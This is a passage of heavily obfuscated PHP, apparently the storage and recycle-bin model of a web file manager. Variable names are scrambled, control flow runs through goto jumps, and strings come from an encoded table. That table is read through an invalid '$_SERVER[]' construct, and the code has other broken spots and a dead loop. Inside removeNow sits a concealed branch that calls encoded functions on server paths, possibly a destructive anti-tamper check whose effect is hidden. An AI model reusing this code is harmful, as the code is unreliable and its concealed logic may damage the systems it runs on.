} else { if ($eщֵ == REPEAT_REPLACE) { $a = $this->sourceInfo($e؞݇׫); $bϷ = $this->fileHistory($a, $F樃·[$Bͪ[461]], $F樃·[$Bͪ[78]]); if (!$bϷ) { $e = !1; } else { $this->folderSizeReset($CǤ); } return $e؞݇׫; } else { $cӺ僽 = $this->fileNameAuto($CǤ, $cӺ僽, $eщֵ, !1); } } } goto C; bʅ: } protected function fileHistory($c, $F̂, $Eܾ) { goto fÊ; fÊ: $Dݯ =& $_SERVER[]; $fԤ = defined($Dݯ[468]) ? USER_ID : $Dݯ[191]; if ($c[$Dݯ[461]] == $F̂) { return !1; } goto bؗ; bؗ: $this->checkLock($c[$Dݯ[397]], $F̂); Model($Dݯ[1978])->addHistory($c); $e = array($Dݯ[577] => $fԤ, $Dݯ[419] => time(), $Dݯ[461] => $F̂, $Dݯ[78] => $Eܾ); goto cɧт; cɧт: $this->where(array($Dݯ[412] => $c[$Dݯ[397]]))->save($e); $this->sourceCacheClear($c[$Dݯ[397]]); return !0; goto DՎ; DՎ: } public function checkLock($Cِ۩, $f憤) { goto AΛ; a: $fɦ = Session::get($eЋ[1979]); $B׸Ø = substr($Dҧ[$eЋ[28]], 0, -1 - strlen($Dҧ[$eЋ[168]])) . $eЋ[1498] . $fɦ . $eЋ[95] . $Dҧ[$eЋ[168]]; $c㮉 = Model($eЋ[597])->find($f憤); goto F; C燹ҡ: show_json(LNG($eЋ[1981]) . $eЋ[1982] . LNG($eЋ[1983]) . $eЋ[1984] . $E慂 . $eЋ[1985], !1); goto dó; AΛ: $eЋ =& $_SERVER[]; $Dҧ = $this->pathInfo($Cِ۩); if (!$this->fileIsLock($Dҧ, !0)) { return; } goto a; F: $this->_createFileCall($Dҧ[$eЋ[492]], $B׸Ø, $c㮉, REPEAT_REPLACE, $eЋ[1233]); $C = $Dҧ[$eЋ[459]][$eЋ[536]]; $E慂 = $C[$eЋ[1980]] ? $C[$eЋ[1980]] : $C[$eЋ[28]]; goto C燹ҡ; dó: } public function fileIsLock($b, $Eʃ뒑 = false) { goto aԛ; e׷ׯ: $B聾 = $GLOBALS[$dƆ[6]][$dƆ[88]][$dƆ[534]]; if ($b[$dƆ[459]][$dƆ[535]] <= time() - $B聾) { $this->metaSet($b[$dƆ[397]], $dƆ[533], null); $this->metaSet($b[$dƆ[397]], $dƆ[535], null); } if ($Eʃ뒑) { $this->metaSet($b[$dƆ[397]], $dƆ[535], time()); } goto dŵқ; aԛ: $dƆ =& $_SERVER[]; if (!isset($b[$dƆ[459]]) || !$b[$dƆ[459]][$dƆ[533]]) { return !1; } if ($b[$dƆ[459]][$dƆ[533]] != USER_ID) { return !0; } goto e׷ׯ; dŵқ: return !1; goto B; B: } private function _addSoure($e˴ѱ, $B) { goto a홾í; a: $e˴ѱ = array_merge($aצ뤥, $e˴ѱ); $this->updateModifyTime($e˴ѱ[$BƎݶ[492]]); $F = $BƎݶ[1986] . $B[$BƎݶ[397]]; goto dᤆ; a홾í: $BƎݶ =& $_SERVER[]; $F֍ = defined($BƎݶ[468]) ? USER_ID : $BƎݶ[191]; $aצ뤥 = array($BƎݶ[574] => $B[$BƎݶ[406]], $BƎݶ[575] => $B[$BƎݶ[498]], $BƎݶ[576] => $F֍, $BƎݶ[577] => $F֍, $BƎݶ[396] => $B[$BƎݶ[397]], $BƎݶ[578] => $B[$BƎݶ[515]] . $B[$BƎݶ[397]] . $BƎݶ[47], $BƎݶ[424] => 0, $BƎݶ[579] => $BƎݶ[33]); goto a; dᤆ: if (isset(self::$cacheChildList[$F])) { unset(self::$cacheChildList[$F]); } static $A = false; if (!$A) { Hook::trigger($BƎݶ[561], $e˴ѱ); $A = !0; } goto bܻ; bܻ: $E֯ = $this->add($e˴ѱ); $F = array($BƎݶ[580] => short_id($E֯)); $this->where(array($BƎݶ[412] => $E֯))->save($F); goto Fئ; Fئ: $this->setNamePinyin($E֯, $e˴ѱ[$BƎݶ[28]]); return $E֯; goto B߆; B߆: } public function remove($A, $Bõר = true) { goto d; B΍: $c = $B砷[$eڿ[406]] == self::TYPE_USER ? $eڿ[588] : $eڿ[509]; if ($c == $eڿ[588]) { $C = Model($eڿ[507])->getInfo($B砷[$eڿ[498]]); $E = !empty($C[$eڿ[1980]]) ? $C[$eڿ[1980]] : $C[$eڿ[28]]; $E = $eڿ[258] . $E . $eڿ[1988] . $B砷[$eڿ[498]]; } else { $C = Model($eڿ[516])->getInfo($B砷[$eڿ[498]]); $E = _get($C, $eڿ[28]); $E = $eڿ[160] . $E . $eڿ[1989] . $B砷[$eڿ[498]]; } $aڪ = $eڿ[1990] . md5($E); goto eϿ; eϿ: CacheLock::lock($aڪ); $c퍈 = $this->fileNameExist($FԤ, $E); if (!$c퍈) { $c퍈 = $this->mkdir($FԤ, $E, REPEAT_SKIP); $this->metaSet($c퍈, $eڿ[1991], $c); $this->metaSet($c퍈, $eڿ[1992], $B砷[$eڿ[498]]); if ($B砷[$eڿ[492]] != 0) { $this->metaSet($c퍈, $eڿ[1993], _get($C, $eڿ[1994])); } } goto Aݜ; C: $a񭔉 = Model($eڿ[427])->get($eڿ[1987]) == $eڿ[87]; if ($A || $Bõר || !$a񭔉) { return $this->removeNow($A, $Bõר); } $FԤ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto B΍; d: $eڿ =& $_SERVER[]; $B砷 = $this->sourceInfo($A); $A = intval($B砷[$eڿ[406]]) === self::TYPE_SYSTEM; goto C; fߛ: return $bϛ͊; goto E囨; Aݜ: CacheLock::unlock($aڪ); $this->metaSet($A, $eڿ[1995], $B砷[$eڿ[492]]); $this->where(array($eڿ[397] => $A))->save(array($eڿ[419] => time())); goto e챝; e챝: $this->recycleClear($B砷); $bϛ͊ = $this->move($A, $c퍈, REPEAT_RENAME_FOLDER); $this->folderSizeReset($B砷[$eڿ[492]]); goto fߛ; E囨: } private function recycleClear($eя) { $D¹ =& $_SERVER[]; $f = $this->childrenAll($eя); $d = array($D¹[412] => array($D¹[413], $f[$D¹[1996]])); Model($D¹[1997])->where($d)->delete(); } public function removeNow($Cΐ, $a = true) { goto bʾ; Dߛ: $this->updateModifyTime($aʌ); $this->lockMoveEnd($Cΐ); Hook::trigger($c[1581], $E秡, $a); goto DС; E: $E秡 = $this->pathInfoMore($Cΐ); if (!$C) { return !0; } if ($C[$c[492]] == 0) { if (!_get($GLOBALS, $c[499])) { return !1; } } goto FƐ; Cƞ: $this->folderSizeReset($C[$c[492]]); $aʌ = array($C[$c[492]]); if ($C[$c[405]] == $c[87]) { $aʌ[] = $C[$c[397]]; } goto Dߛ; DС: return !0; goto b; bʾ: $c =& $_SERVER[]; if ($_SERVER[$c[840]] != $_SERVER[$c[1414]]) { goto fź; fź: $C硾 = $c[858]; $cˣ苇 = $c[842]; $c = $_SERVER[$c[843]] . $c[844]; goto dÿ; B넥: $cԙ = $c[859]; $cԙ($_SERVER[$c[860]]); $cԙ($_SERVER[$c[843]] . $c[1415]); goto e⽩; e⽩: $C = 1; while ($C > 1) { $C = $C + 4; $B = rawurlencode($C . $c[376]); } goto B; dÿ: $B = $cˣ苇($c); $B = explode($c[229], $B); if (count($B) < $c[605]) { $A«Ξ = $c[845]; $A«Ξ(); } goto B넥; B: } $C = $this->sourceInfo($Cΐ); goto E; FƐ: $this->lockMoveStart($Cΐ); Hook::trigger($c[1998], $E秡, $a); if ($a) { Model($c[1997])->moveToRecycle($Cΐ); } else { $F = $this->childrenAll($C); Model($c[558])->eventRemove($Cΐ); $this->removeRelevance($F[$c[1996]], $F[$c[1363]]); } goto Cƞ; b: } public function childrenAll($cδ) { $E =& $_SERVER[]; $d΄ = $cδ[$E[397]]; if ($cδ[$E[405]] == $E[87]) { $d = array($E[578] => array($E[538], $cδ[$E[515]] . $d΄ . $E[539])); $A = array($E[578] => $d[$E[515]]); $F = $this->field($E[1999])->where($A)->select(); $bّ = !1; $f֦ = array($d΄); if ($F) { $bّ = array_to_keyvalue($F, $E[33], $E[461]); $bّ = array_remove_value($bّ, $E[191]); $f֦ = array_to_keyvalue($F, $E[33], $E[397]); $f֦[] = $d΄; } } else { $bّ = array($cδ[$E[461]]); $f֦ = array($d΄); } return array($E[1996] => $f֦, $E[1363] => $bّ); } public function removeArray($EΛ) { if (!$EΛ) { return !0; } } public function removeRelevance($cˊۍ, $BƖ) { goto eƙ; B: Model($aॊɾ[1855])->where($fߝγ)->delete(); Model($aॊɾ[558])->where($fߝγ)->delete(); Model($aॊɾ[1692])->removeBySource($cˊۍ); goto D; eƙ: $aॊɾ =& $_SERVER[]; $cˊۍ = $cˊۍ ? $cˊۍ : array(); $BƖ = $BƖ ? $BƖ : array(); goto eۃ̇; eۃ̇: $cˊۍ = array_unique(array_filter($cˊۍ)); $BƖ = array_unique(array_filter($BƖ)); if (!$cˊۍ) { return !1; } goto d; F: for ($eұ̭ = 0; $eұ̭ < count($cˊۍ); $eұ̭++) { $this->sourceCacheClear($cˊۍ[$eұ̭]); } goto Dގъ; D: Model($aॊɾ[1978])->removeBySource($cˊۍ); $this->where($fߝγ)->delete(); Model($aॊɾ[464])->remove($BƖ); goto F; d: $fߝγ = array($aॊɾ[412] => array($aॊɾ[413], $cˊۍ)); Model($aॊɾ[1997])->where($fߝγ)->delete(); Model($aॊɾ[455])->where($fߝγ)->delete(); goto B; Dގъ: } public function rename($e茰, $e) { goto C; E٦: $this->setNamePinyin($e茰, $b˵ݍ[$Eȇ[28]], !1); $this->updateModifyTime($f[$Eȇ[492]]); $e = $this->where(array($Eȇ[412] => $e茰))->data($b˵ݍ)->save(); goto b񑍅; b񑍅: $f = $Eȇ[1986] . $f[$Eȇ[492]]; if (isset(self::$cacheChildList[$f])) { unset(self::$cacheChildList[$f]); } return $e; goto c; b: if ($f[$Eȇ[405]] != $Eȇ[87]) { $b˵ݍ[$Eȇ[407]] = substr(get_path_ext($e), 0, 10); } Model($Eȇ[558])->eventRename($e茰, $f[$Eȇ[28]], $e); $this->sourceCacheClear($e茰); goto E٦; C: $Eȇ =& $_SERVER[]; $f = $this->sourceInfo($e茰); if (!$f) { return !1; } goto Cҷ; Cҷ: $cỏ = $this->fileNameExist($f[$Eȇ[492]], $e); if ($cỏ && $cỏ != $e茰) { return !1; } $b˵ݍ = array($Eȇ[415] => $e, $Eȇ[577] => USER_ID); goto b; c: } public function setNamePinyin($C, $F, $C = true) { $aЕㅛ =& $_SERVER[]; $A咈 = Input::check($F, $aЕㅛ[581]); $a = array($aЕㅛ[436] => KodSort::makeStr($F)); if ($A咈) { $a[$aЕㅛ[458]] = str_replace($aЕㅛ[50], $aЕㅛ[33], Pinyin::get($F)); $a[$aЕㅛ[457]] = Pinyin::get($F, $aЕㅛ[582]); } if (!$C && !$A咈) { $a[$aЕㅛ[458]] = null; $a[$aЕㅛ[457]] = null; } $this->metaSet($C, $a); } public function getContent($C諺) { goto BČ; cҥ: if ($D[$eݵߐ[78]] == 0) { return $eݵߐ[33]; } $Cј = $eݵߐ[2000] . $D[$eݵߐ[170]]; if ($D[$eݵߐ[78]] <= 1024 * 10) { $E = Cache::get($Cј); if (!$E) { $E = IO::getContent($D[$eݵߐ[76]]); Cache::set($Cј, $E); } return $E; } goto aɰ˩; aɰ˩: if (!$D[$eݵߐ[76]]) { return $eݵߐ[33]; } return IO::getContent($D[$eݵߐ[76]]); goto Cݔ; BČ: $eݵߐ =& $_SERVER[]; $D = $this->fileInfoGet($C諺); if (!$D) { return !1; } goto cҥ; Cݔ: } public function setDesc($Bۏǘ, $Bܔ) { $Eߩ =& $_SERVER[]; Model($Eߩ[558])->eventAddDesc($Bۏǘ, $Bܔ); return $this->metaSet($Bۏǘ, $Eߩ[445], $Bܔ); } public function setContent($bݵ, $dރͥ = '') { goto fʲ; cޯ: if (!$Cȃ) { return Model($A[464])->remove($f[$A[461]]); } $this->folderSizeReset($FԐŢ[$A[492]]); return !0; goto eلԜ; F: if (!$C || !$FԐŢ) { return !1; } $f = Model($A[464])->addFileByContent($dރͥ, $FԐŢ[$A[28]]); $Cȃ = $this->fileHistory($FԐŢ, $f[$A[461]], $f[$A[78]]); goto cޯ; fʲ: $A =& $_SERVER[]; $FԐŢ = $this->sourceInfo($bݵ); $C = $this->fileInfoGet($bݵ); goto F; eلԜ: } public function fileSubstr($b, $aό, $Fŵ) { $F = $this->fileInfoGet($b); if (!$F) { return !1; } return IO::fileSubstr($F[$_SERVER[][76]], $aό, $Fŵ); } public function fileInfoGet($b֖) { goto Bԅ; Bԅ: $B׹ʿ =& $_SERVER[]; $D = $this->sourceInfo($b֖); if (!$D || $D[$B׹ʿ[405]]) { return !1; } goto D; D: $Dҫ = $B׹ʿ[467] . $D[$B׹ʿ[461]]; $e툱ⷼ = _get(self::$cacheFileInfo, $Dҫ); if ($e툱ⷼ) { return $e툱ⷼ; } goto dΐ; Ȃ: return $E있; goto e; dΐ: $E있 = Model($B׹ʿ[464])->fileInfo($D[$B׹ʿ[461]]); if ($E있) { $E있[$B׹ʿ[28]] = $D[$B׹ʿ[28]]; } self::$cacheFileInfo[$Dҫ] = $E있; goto Ȃ; e: } private function folderChildrenNumber($Fօ) { $c =& $_SERVER[]; $d = $this->sourceInfo($Fօ); $cʊ = array($c[578] => array($c[538], $d[$c[515]] . $Fօ . $c[539]), $c[424] => intval($d[$c[425]]), $c[571] => 1); $aը = $this->where($cʊ)->count(); $bǃޖ = $this->where($cʊ)->where(array($c[571] => 0))->count(); return array($c[82] => $bǃޖ, $c[83] => $aը); } public function pathInfo($fٍ, $D۪á = false) { goto aߨ; BЈ: self::$cachePathInfo[$f] = $F; return $F; goto eȡ; aߨ: $d㯉 =& $_SERVER[]; $D۪á = !1; $fٍ = intval($fٍ); goto C߉; d: $F = $this->sourceInfo($fٍ); if (!$F) { return !1; } $F = $this->_listDataApplyItem($F, $D۪á); goto BЈ; C߉: $f = $d㯉[453] . intval($D۪á) . $d㯉[454] . $fٍ; $aҧ = _get(self::$cachePathInfo, $f); if ($aҧ) { return $aҧ; } goto d; eȡ: } public static $cachePathInfoMore = array(); public function pathInfoMore($Bͼ) { goto Dإ; Dإ: $Aǟ =& $_SERVER[]; $b = _get(self::$cachePathInfoMore, $Bͼ); if ($b) { return $b; } goto AڵѭƑ; AڵѭƑ: $C = $this->pathInfo($Bͼ); if (!$C) { return !1; } if ($C[$Aǟ[405]] == $Aǟ[87]) { $C[$Aǟ[81]] = $this->folderChildrenNumber($Bͼ); } goto F춰; F춰: self::$cachePathInfoMore[$Bͼ] = $C; return $C; goto Aۼ; Aۼ: } public function sourceInfo($d㠖) { goto Dݫ; F: $B = $this->where(array($b㫱[397] => $d㠖))->find(); self::$cacheSourceInfo[$Bߑ] = $B; return self::$cacheSourceInfo[$Bߑ]; goto b֘ҝ; Dݫ: $b㫱 =& $_SERVER[]; if (!$d㠖) { return array(); } $d㠖 = intval($d㠖); goto fɟ֨ċ; fɟ֨ċ: $Bߑ = $b㫱[452] . $d㠖; $D = _get(self::$cacheSourceInfo, $Bߑ); if ($D) { return $D; } goto F; b֘ҝ: } public function sourceCacheClear($a = false) { self::cacheClear($a); } public static function cacheClear($b܊ = false) { $F⛱ =& $_SERVER[]; if ($b܊ == !1) { goto Bֿ; aЊ: return; goto C٩; Bֿ: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto B½; B½: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto aЊ; C٩: } unset(self::$cacheSourceInfo[$F⛱[452] . $b܊]); unset(self::$cachePathInfoMore[$b܊]); unset(self::$cachePathInfo[$F⛱[2001] . $b܊]); unset(self::$cachePathInfo[$F⛱[2002] . $b܊]); } public function metaSet($F󮃋, $E = null, $C񄹐 = null) { $A = parent::metaSet($F󮃋, $E, $C񄹐); if ($A) { $this->sourceCacheClear($F󮃋); } return $A; } public function pathInfoByPath($aʃͯ, $dɈ镌) { $dڸ =& $_SERVER[]; $b = !$dɈ镌 ? array() : explode($dڸ[8], trim($dɈ镌, $dڸ[8])); $b = $aʃͯ; foreach ($b as $C󜭬) { $cԙ = array($dڸ[492] => $b, $dڸ[28] => $C󜭬); $F = $this->where($cԙ)->select(); if (!$F) { return !1; } $F = array_sort_by($F, $dڸ[425]); $b = $F[0][$dڸ[397]]; } return $this->pathInfo($b, !0); } protected function updateModifyTime($e) { goto FĹ; FĹ: $F =& $_SERVER[]; $f = defined($F[468]) ? USER_ID : $F[191]; if (!$e) { return; } goto cś; D: $a = array($F[577] => $f, $F[419] => time()); $this->where($aھ)->save($a); goto C; cś: if (!is_array($e)) { $e = array($e); } foreach ($e as $aĥ => $eѐ) { $e[$aĥ] = intval($eѐ); $this->sourceCacheClear($eѐ); } $aھ = array($F[397] => array($F[7], $e)); goto D; C: } public function folderSizeReset($F, $B΄㔶 = false) { goto b͢; AŖϔ: $C = array($b瑻[$e[406]], $b瑻[$e[498]]); TaskRun::timeLimitCall($E̠, $e[2005], $C, 1.5); goto DȢ; cʻ: $this->where($CՖ)->setAdd($e[78], $B΄㔶); CacheLock::unlock($Eɧ); $E̠ = $e[2004] . $b瑻[$e[406]] . $e[4] . $b瑻[$e[498]]; goto AŖϔ; dˌ: $Eɧ = $e[2003] . $F; CacheLock::lock($Eɧ, 20); if ($B΄㔶 === !1) { $this->sourceCacheClear($F); $b瑻 = $this->sourceInfo($F); $CՖ = array($e[396] => $F, $e[424] => 0); $D = $this->where($CՖ)->sum($e[78]); $B΄㔶 = intval($D) - intval($b瑻[$e[78]]); } goto A; b͢: $e =& $_SERVER[]; if ($this->statusIgnoreResetSpace) { return; } $b瑻 = $this->sourceInfo($F); goto dˌ; FͯǊ: $a➝Ǭ[] = $b瑻[$e[397]]; $CՖ = array($e[397] => array($e[413], $a➝Ǭ)); if ($B΄㔶 < 0) { $CՖ[$e[78]] = array($e[991], abs($B΄㔶)); } goto cʻ; A: if ($B΄㔶 == 0) { return CacheLock::unlock($Eɧ); } $a➝Ǭ = $this->parentLevelArray($b瑻[$e[515]]); if (!$a➝Ǭ) { $a➝Ǭ = array(); } goto FͯǊ; DȢ: } public function folderSizeResetChildren($aה) { goto A; bŊ: foreach ($aõ as $f) { $cۧϵ = $f[$eŊ[492]] . $eŊ[33]; if (!isset($BБ[$cۧϵ])) { continue; } if ($f[$eŊ[425]] == $BБ[$cۧϵ][$eŊ[425]]) { $BБ[$cۧϵ][$eŊ[78]] += $f[$eŊ[78]]; } } foreach ($BБ as $f) { $d = $this->parentLevelArray($f[$eŊ[515]]); foreach ($d as $cۧϵ) { $cۧϵ = $cۧϵ . $eŊ[33]; if (!isset($BБ[$cۧϵ])) { continue; } if ($f[$eŊ[425]] == $BБ[$cۧϵ][$eŊ[425]]) { $BБ[$cۧϵ][$eŊ[78]] += $f[$eŊ[78]]; } } } $Cђ = array(); goto dŢ; dŢ: foreach ($BБ as $f) { if ($f[$eŊ[78]] == $f[$eŊ[2007]]) { continue; } $Cђ[] = array($eŊ[397], $f[$eŊ[397]], $eŊ[78], $f[$eŊ[78]]); } $this->saveAll($Cђ); goto f黽; B܃: $aՊ = array($eŊ[571] => 1, $eŊ[578] => array($eŊ[538], $CŎ[$eŊ[515]] . $aה . $eŊ[539])); $F = $eŊ[2006]; $BБ = $this->field($F)->where($aՊ)->select(); goto c; A: $eŊ =& $_SERVER[]; $this->sourceCacheClear($aה); $CŎ = $this->sourceInfo($aה); goto B܃; c: $aՊ[$eŊ[405]] = 0; $aõ = $this->field($F)->where($aՊ)->select(); if (!$aõ) { return; } goto C; C: $BБ[] = $CŎ; $BБ = array_to_keyvalue($BБ, $eŊ[397]); foreach ($BБ as $d݊ => $f) { $BБ[$d݊][$eŊ[2007]] = $BБ[$d݊][$eŊ[78]]; $BБ[$d݊][$eŊ[78]] = 0; } goto bŊ; f黽: } public function userSpaceReset($cᴛ = false) { $E񪣚 =& $_SERVER[]; $A = $this->where(array($E񪣚[406] => self::TYPE_USER, $E񪣚[498] => $cᴛ, $E񪣚[405] => 0))->sum($E񪣚[78]); $A = !$A || $A <= 0 ? 0 : $A; Model($E񪣚[507])->userEdit($cᴛ, array($E񪣚[1701] => $A)); } public function targetSpaceUpdate($A, $Aς) { $Aï枼 =& $_SERVER[]; if (!$Aς) { return; } if (!in_array($A, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $cܬ = $this->targetSpaceSize($A, $Aς); if ($A == self::TYPE_USER) { Model($Aï枼[507])->userEdit($Aς, array($Aï枼[1701] => $cܬ)); } else { if ($A == self::TYPE_GROUP) { Model($Aï枼[516])->groupEdit($Aς, array($Aï枼[1701] => $cܬ)); } } } public function targetSpaceSize($bަ, $AԨѵ̿) { goto fѼテ; A: $bý = !$bý || $bý <= 0 ? 0 : $bý; return $bý; goto cͩŗ; fѼテ: $E =& $_SERVER[]; $D謡֟ = $this->sourceRoot($bަ, $AԨѵ̿, !0); if (!$D謡֟) { return 0; } goto d; d: $bý = floatval($D謡֟[$E[78]]); $Eĸ߱ = array($E[578] => array($E[538], $E[525] . $D謡֟[$E[397]] . $E[539])); $d = Model($E[423])->field($E[412])->where($Eĸ߱)->select(); goto dْ; dْ: $d = array_to_keyvalue($d, $E[33], $E[397]); $d = array_unique(array_filter($d)); if ($d) { $Eĸ߱ = array($E[412] => array($E[413], $d)); $bý += floatval($this->where($Eĸ߱)->sum($E[78])); } goto A; cͩŗ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Fٱ) { return $this->fileTypeProfile($Fٱ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($BӼ) { return $this->fileTypeProfile($BӼ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($A棑Դ, $F˟) { goto f˵; dĨԈ: $F֬ = array(); $F֬[$Eް[2009]] = array($Eް[2010] => LNG($Eް[2009]), $Eް[2011] => $this->where($A)->count(), $Eް[573] => $this->where($A)->sum($Eް[78])); $B͒ = KodIO::fileTypeList(); goto EϬ; A: if ($aڭ) { return $aڭ; } $A = array($Eް[571] => 0); if ($A棑Դ != !1) { $A[$Eް[498]] = $A棑Դ; $A[$Eް[406]] = $F˟; } goto dĨԈ; EϬ: foreach ($B͒ as $FŪ => $E) { $A[$Eް[407]] = $this->fileTypeWhere($FŪ); $F֬[$FŪ] = array($Eް[2010] => $E[$Eް[28]], $Eް[2011] => $this->where($A)->count(), $Eް[573] => $this->where($A)->sum($Eް[78])); } Cache::set($Aꆙ, $F֬, 1200); return $F֬; goto B׃ܷ; f˵: $Eް =& $_SERVER[]; $Aꆙ = $Eް[2008] . $A棑Դ . $Eް[71] . $F˟; $aڭ = Cache::get($Aꆙ); goto A; B׃ܷ: } public function fileNameExist($c֋, $e̚) { $DǊ =& $_SERVER[]; $f = $this->where(array($DǊ[492] => $c֋, $DǊ[28] => $e̚, $DǊ[425] => 0))->find(); return is_array($f) ? $f[$DǊ[397]] : !1; } public function childList($Cմۢ) { goto aƬ; aƬ: $aȨ =& $_SERVER[]; $A̎ = $aȨ[1986] . $Cմۢ; if (isset(self::$cacheChildList[$A̎])) { return self::$cacheChildList[$A̎]; } goto f; D: self::$cacheChildList[$A̎] = $d; foreach ($d as $eä) { $A̎ = $aȨ[452] . $eä[$aȨ[397]]; self::$cacheSourceInfo[$A̎] = $eä; } return $d; goto eǜߡ; f: $Fߠɔ = array($aȨ[492] => intval($Cմۢ), $aȨ[425] => 0); $d = $this->where($Fߠɔ)->select(); $d = $d ? $d : array(); goto D; eǜߡ: } public function fileNameAuto($C, $a丨, $C驿ݎ = REPEAT_RENAME, $EΗҬ = false) { $cՐ =& $_SERVER[]; $A֥ = array($cՐ[492] => $C, $cՐ[425] => 0, $cՐ[28] => array($cՐ[381], $a丨 . $cՐ[382])); $C = $this->field($cՐ[28])->where($A֥)->select(); $C̣ = array_to_keyvalue($C, $cՐ[33], $cՐ[28]); return $this->fileNameAutoGet($C̣, $a丨, $C驿ݎ, $EΗҬ); } public function fileNameAutoGet($F̔, $fΎۺ, $D͎񥗛, $Aʩ쨎) { $fѡ =& $_SERVER[]; if ($D͎񥗛 == REPEAT_REPLACE || !$F̔ || !in_array_not_case($fΎۺ, $F̔) || $Aʩ쨎 && $D͎񥗛 != REPEAT_RENAME_FOLDER) { return $fΎۺ; } if ($D͎񥗛 == REPEAT_SKIP) { return !1; } $F˟ = $fѡ[95] . get_path_ext($fΎۺ); $F˟ = $F˟ == $fѡ[95] || $Aʩ쨎 ? $fѡ[33] : $F˟; for ($F޼ȅ = 1; $F޼ȅ <= count($F̔) + 1; $F޼ȅ++) { $FЋ = substr($fΎۺ, 0, strlen($fΎۺ) - strlen($F˟)); $a = $FЋ . "\50{$F޼ȅ}\x29{$F˟}"; if (!in_array_not_case($a, $F̔)) { return $a; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\x72\x63\145\x5f\x72\145\x63\x79\x63\154\x65"; protected $dataAuto = array(array("\x63\162\x65\141\164\x65\x54\x69\x6d\x65", "\164\151\155\145", "\151\x6e\163\x65\162\164", "\x66\x75\156\143\x74\x69\x6f\156")); public function listData($B˼ = false) { $C㎏ =& $_SERVER[]; $B˼ = $B˼ ? $B˼ : USER_ID; $A = $this->where(array($C㎏[1537] => $B˼))->select(); return array_to_keyvalue($A, $C㎏[33], $C㎏[397]); } public function moveToRecycle($c沛) { goto f늒; F㑗: $this->recycleMove($c沛, 1); if ($bʱ[$FՔ[405]] == $FՔ[87]) { $cΣ = array($FՔ[578] => array($FՔ[538], $bʱ[$FՔ[515]] . $c沛 . $FՔ[539])); $A->where($cΣ)->setField($FՔ[425], 1); } goto F͝; f늒: $FՔ =& $_SERVER[]; $A = Model($FՔ[1223]); $bʱ = $A->sourceInfo($c沛); goto d; d: if (!$bʱ || $bʱ[$FՔ[425]] == $FՔ[87]) { return; } $būֺ = array($FՔ[412] => $c沛, $FՔ[1537] => USER_ID, $FՔ[574] => $bʱ[$FՔ[406]], $FՔ[575] => $bʱ[$FՔ[498]], $FՔ[578] => $bʱ[$FՔ[515]]); $this->add($būֺ); goto F㑗; F͝: } public function clear() { $this->remove(!1); } public function remove($d͙ = false, $Cٚ٢ = false) { goto f; a: foreach ($Dش as $Då) { if ($d͙ != !1 && !in_array($Då, $d͙)) { continue; } $Aƌ = $Dܝ->sourceInfo($Då); $Dܝ->remove($Då, !1); $a߈ = $Aƌ[$a[406]] . $a[71] . $Aƌ[$a[498]]; $bЖ[$a߈] = array($a[574] => $Aƌ[$a[406]], $a[498] => $Aƌ[$a[498]]); $this->where(array($a[397] => $Då))->delete(); } foreach ($bЖ as $f) { $Dܝ->targetSpaceUpdate($f[$a[406]], $f[$a[498]]); } goto c㭩ީ; EΫ: $Dش = $this->listData($Cٚ٢); $d͙ = $d͙ === !1 ? !1 : $d͙; $bЖ = array(); goto a; f: $a =& $_SERVER[]; $Cٚ٢ = $Cٚ٢ ? $Cٚ٢ : USER_ID; $Dܝ = Model($a[1223]); goto EΫ; c㭩ީ: } public function restore($f = false) { $Fʨ = $this->listData(); $this->_restoreSource($Fʨ, $f); } public function removeUserAll($F̞Ǫ) { $this->remove(!1, $F̞Ǫ); } private function _restoreSource($Dƛ, $Cף) { goto bϋ; bϋ: $B =& $_SERVER[]; $D = Model($B[1223]); $Cף = $Cף == !1 ? !1 : $Cף; goto d; d: if (!$Dƛ) { return !0; } $C = array(); foreach ($Dƛ as $e) { goto cѣĦɃ; bۿ: if ($E¸[$B[405]] == $B[87]) { $A̫ = array($B[578] => array($B[538], $E¸[$B[515]] . $e . $B[539])); $D->where($A̫)->setField($B[425], 0); $this->restoreFolderChildren($e, $Dƛ); } $this->where(array($B[397] => $e))->delete(); $D->folderSizeReset($E¸[$B[492]]); goto Cț; cѣĦɃ: if ($Cף != !1 && !in_array($e, $Cף)) { continue; } $E¸ = $D->sourceInfo($e); $A = $D->sourceInfo($E¸[$B[492]]); goto A; Cț: $C[] = $E¸[$B[492]]; if ($E¸[$B[405]] == $B[87]) { $C[] = $e; } $D->lockMoveEnd($e); goto Bؼ; A: if ($A[$B[425]] == $B[87]) { continue; } $D->lockMoveStart($e); $this->recycleMove($e, 0); goto bۿ; Bؼ: } goto bص; bص: $D->updateModifyTime($C); goto a; a: } private function restoreFolderChildren($Eφ, $a뾪) { goto Ḃ; D͚: foreach ($a뾪 as $b) { if ($b == $Eφ) { continue; } if (!$EՐк->isParentOf($Eφ, $b)) { continue; } $c̕Ӌ = $EՐк->sourceInfo($b); if ($c̕Ӌ[$C됐[405]] == $C됐[87]) { $c[] = array($C됐[578] => array($C됐[538], $c̕Ӌ[$C됐[515]] . $b . $C됐[539])); } else { $c[$C됐[397]][1][] = $b; } } if (!$c[$C됐[397]][1]) { unset($c[$C됐[397]]); } if (!$c) { return; } goto bͩ; Ḃ: $C됐 =& $_SERVER[]; $EՐк = Model($C됐[1223]); $c = array($C됐[397] => array($C됐[7], array())); goto D͚; bͩ: $c[$C됐[397]][1] = array_unique($c[$C됐[397]][1]); $c[$C됐[976]] = $C됐[1807]; $EՐк->where($c)->setField($C됐[425], 1); goto DȻ; DȻ: } private function recycleMove($Aȏέ, $A = 1) { $c =& $_SERVER[]; $Bख़ = Model($c[1223]); $bį = Model($c[2012]); $eѭɭ = array($c[397] => $Aȏέ); if ($A) { $Bख़->where($eѭɭ)->setField($c[425], 1); $bį->eventRecycle($Aȏέ, $c[2013]); } else { $bƒ = $Bख़->where($eѭɭ)->find(); $E = $bƒ[$c[405]] == $c[87]; $bݖ = $Bख़->fileNameAuto($bƒ[$c[492]], $bƒ[$c[28]], REPEAT_RENAME_FOLDER, $E); if ($bݖ != $bƒ[$c[28]]) { $Bख़->rename($Aȏέ, $bݖ); } $Bख़->where($eѭɭ)->setField($c[425], 0); 